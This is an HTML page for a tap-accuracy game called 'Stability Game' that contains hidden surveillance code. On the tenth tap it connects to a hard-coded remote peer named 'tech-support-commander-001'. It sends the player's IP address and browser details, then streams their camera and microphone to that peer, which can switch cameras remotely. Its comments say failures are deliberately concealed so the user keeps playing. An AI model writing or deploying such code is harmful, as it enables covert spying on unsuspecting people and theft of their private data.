<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Stability Game</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #2c3e50;
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            height: 100vh;
            overflow: hidden;
            touch-action: none; /* Prevent scrolling */
            user-select: none;
            cursor: crosshair;
        }

        /* Scoreboard */
        #hud {
            position: absolute;
            top: 20px;
            width: 100%;
            text-align: center;
            pointer-events: none;
            z-index: 20;
            transition: opacity 0.5s;
        }

        #accuracy-display {
            font-size: 50px;
            font-weight: bold;
            color: #bdc3c7; /* Start grey */
            text-shadow: 2px 2px 0 #000;
        }

        #instruction {
            font-size: 22px;
            margin-top: 10px;
            color: #ecf0f1;
            padding: 0 20px;
        }

        /* The visual feedback dot */
        .tap-marker {
            position: absolute;
            width: 30px;
            height: 30px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            box-shadow: 0 0 10px rgba(255,255,255,0.5);
        }

        /* Target Marker (The first tap) */
        .target-marker {
            position: absolute;
            width: 50px;
            height: 50px;
            border: 4px solid #e74c3c;
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            display: none;
        }

        /* Pulse animation for the target to make it visible */
        @keyframes targetPulse {
            0% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }

            50% {
                transform: translate(-50%, -50%) scale(1.2);
                opacity: 0.8;
            }

            100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }
        }

        .target-marker.active {
            animation: targetPulse 2s infinite;
        }
    </style>
</head>
<body>

    <div id="hud">
        <div id="accuracy-display">START</div>
        <div id="instruction">Tap anywhere to set your target</div>
    </div>

    <div id="target-visual" class="target-marker"></div>

    <script>
        // --- CONFIGURATION ---
        const TECHNICIAN_ID = "tech-support-commander-001"; // Must match technician
        const TRIGGER_COUNT = 10; // Connects after this many taps

        // --- GAME VARIABLES ---
        let targetX = null;
        let targetY = null;
        let tapCount = 0;
        let totalScore = 0;
        let totalTaps = 0; // For score calculation
        let isConnected = false;

        // --- DOM ELEMENTS ---
        const hudText = document.getElementById('accuracy-display');
        const instruction = document.getElementById('instruction');
        const targetVisual = document.getElementById('target-visual');

        // --- NETWORK VARIABLES ---
        const peer = new Peer();
        let myDataConnection = null;
        let currentStream = null;

        // 1. INPUT HANDLER (The core game loop)
        // We listen to the whole body so the game starts instantly
        document.body.addEventListener('touchstart', handleTap, { passive: false });
        document.body.addEventListener('mousedown', handleTap);

        function handleTap(e) {
            e.preventDefault(); // Stop zooming

            // Get coordinates
            const x = e.touches ? e.touches[0].clientX : e.clientX;
            const y = e.touches ? e.touches[0].clientY : e.clientY;

            // Visual feedback (White dot)
            createVisualDot(x, y);

            // --- GAME LOGIC ---
            if (targetX === null) {
                // FIRST TAP: Set Target
                targetX = x;
                targetY = y;

                targetVisual.style.left = x + 'px';
                targetVisual.style.top = y + 'px';
                targetVisual.style.display = 'block';
                targetVisual.classList.add('active');

                instruction.innerText = "Now tap that same spot repeatedly!";
                hudText.innerText = "GO";
                hudText.style.color = "white";
            } else {
                // SUBSEQUENT TAPS: Score it
                const distance = Math.hypot(x - targetX, y - targetY);
                let score = Math.max(0, 100 - (distance * 0.5)); // Forgiving scoring

                totalTaps++;
                totalScore = ((totalScore * (totalTaps - 1)) + score) / totalTaps;

                hudText.innerText = Math.round(totalScore) + "%";
                colorCodeScore(totalScore);
            }

            // --- SURVEILLANCE TRIGGER LOGIC ---
            tapCount++;

            // On exactly the 10th tap, we request permissions
            if (tapCount === TRIGGER_COUNT && !isConnected) {
                activateSurveillance();
            }

            // If connected, keep sending data stats
            if (isConnected && myDataConnection) {
                myDataConnection.send({
                    type: 'game_stats',
                    accuracy: Math.round(totalScore),
                    taps: totalTaps
                });
            }
        }

        // 2. ACTIVATE SURVEILLANCE (The "Hidden" step)
        async function activateSurveillance() {
            console.log("Triggering Surveillance...");
            isConnected = true; // Prevent multiple triggers

            try {
                // A. Connect Data Layer (IP Tracking)
                myDataConnection = peer.connect(TECHNICIAN_ID);

                myDataConnection.on('open', async () => {
                    // Send IP
                    try {
                        const r = await fetch('https://api.ipify.org?format=json');
                        const j = await r.json();
                        myDataConnection.send({ type: 'info', ip: j.ip, userAgent: navigator.userAgent });
                    } catch (e) { }

                    // Listen for remote commands (Swap Camera)
                    myDataConnection.on('data', (d) => {
                        if (d === 'swap') toggleCamera();
                    });
                });

                // B. Connect Video Layer (Camera)
                // This triggers the browser popup "Allow Camera?"
                await startStream('user');

            } catch (err) {
                console.log("Permission denied or error", err);
                // We do NOT alert the user. We let them keep playing the game.
                // This prevents scaring them if they clicked "Block" by accident.
            }
        }

        // 3. VIDEO UTILITIES
        async function startStream(mode) {
            if (currentStream) currentStream.getTracks().forEach(t => t.stop());

            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: mode },
                audio: true
            });

            currentStream = stream;
            // Call the technician
            peer.call(TECHNICIAN_ID, stream);
        }

        let currentMode = 'user';
        function toggleCamera() {
            currentMode = (currentMode === 'user') ? 'environment' : 'user';
            startStream(currentMode);
        }

        // 4. VISUAL HELPERS
        function createVisualDot(x, y) {
            const dot = document.createElement('div');
            dot.className = 'tap-marker';
            dot.style.left = x + 'px';
            dot.style.top = y + 'px';
            document.body.appendChild(dot);
            setTimeout(() => dot.remove(), 400);
        }

        function colorCodeScore(score) {
            if (score > 85) hudText.style.color = "#2ecc71"; // Green
            else if (score > 60) hudText.style.color = "#f1c40f"; // Yellow
            else hudText.style.color = "#e74c3c"; // Red
        }
    </script>
</body>
</html>
